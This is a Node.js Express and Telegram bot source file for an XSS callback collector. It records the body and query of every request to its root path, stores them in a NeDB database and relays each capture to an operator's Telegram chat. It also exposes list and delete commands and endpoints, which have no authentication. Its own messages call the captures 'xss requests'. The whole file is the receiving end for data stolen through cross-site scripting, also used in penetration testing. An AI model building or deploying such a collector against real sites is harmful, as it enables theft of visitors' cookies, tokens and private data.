const express = require('express');
const app = express();
const Datastore = require('nedb');
const db = new Datastore({filename: 'out.db', autoload: true});
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');

// Middleware usage ..
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: true}));
app.set('port', (process.env.PORT || 5000));

const chatId = process.env.TELEGRAM_USER_ID;
const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, {polling: true});

// Delete row ..
bot.onText(/\/delete (.+)/, (msg, match) => {
  const resp = match[1]; // TODO @cagatay check the id is string, prevent nosql object injection.
  if (msg.text.endsWith('all')) {
    db.remove({}, {multi: true}, function (err, numRemoved) {
      bot.sendMessage(chatId, `Removed ${numRemoved} entries from the db`);
    });
  } else {
    db.remove({_id: resp}, {}, (err, numRemoved) => {
      bot.sendMessage(chatId, `Removed ${numRemoved} entry from the db`);
    });
  }
});

// List gained rows ..
bot.onText(/\/list/, (msg) => {
  db.find({}, {}, (err, docs) => {
    bot.sendMessage(chatId, '  🤙 here is your awesome xss request\'s list.. 👻 ``` \n' + JSON.stringify(docs, null, '\t') + ' \n ``` If you want to delete one of them, /delete [_id] 👍🏿 ', {parse_mode: 'Markdown'}).catch(err => {
      if (err.code === 'ETELEGRAM' && err.response.body.description === 'Bad Request: message is too long') {
        bot.sendMessage(chatId, 'Too many docs for one message, sending them one by one.');
        for (let i = 0; i < docs.length; i++) {
          bot.sendMessage(chatId, JSON.stringify(docs[i], null, '\t'));
        }
      }
    });
  });
});

// Ping - Pong!
bot.on('message', (msg) => {
  bot.sendMessage(chatId, `I'm awake! Your chat ID: ${chatId}, don't forget add in your code 🕷`);
});

// Collect all routes
app.all('/:path*?', (req, res, next) => {
  if (req.params.path) {
    next();
  } else {
    console.log('Collection all requests ...');
    let doc = {
      body: req.body,
      query: req.query
    };
    db.insert(doc, (err, newDoc) => {
      if (newDoc && !err) {
        bot.sendMessage(chatId, ' 🤘🏿 new baby on board! 👻 ``` \n' + JSON.stringify(doc, null, '\t') + ' \n ```', {parse_mode: 'Markdown'});
        res.json(doc);
      } else {
        res.json(err);
      }
    });
  }
});

// HTTP List endpoint ..
app.get('/list', (req, res) => {
  db.find({}, (err, docs) => {
    res.json(err ? err : docs)
  });
});

// HTTP Delete endpoint ..
app.get('/delete/:id?', (req, res) => {
  if (req.params.id && req.params.id.length > 0 && typeof req.params.id === 'string') {
    db.remove({_id: req.params.id}, {}, (err, numRemoved) => {
      res.json({err, numRemoved});
    });
  } else {
    res.json({response: 'Please send _id with /delete/123'});
  }
});

// HTTP Listen ..
app.listen(app.get('port'), () => {
  console.log('Node app is running on port', app.get('port'));
});
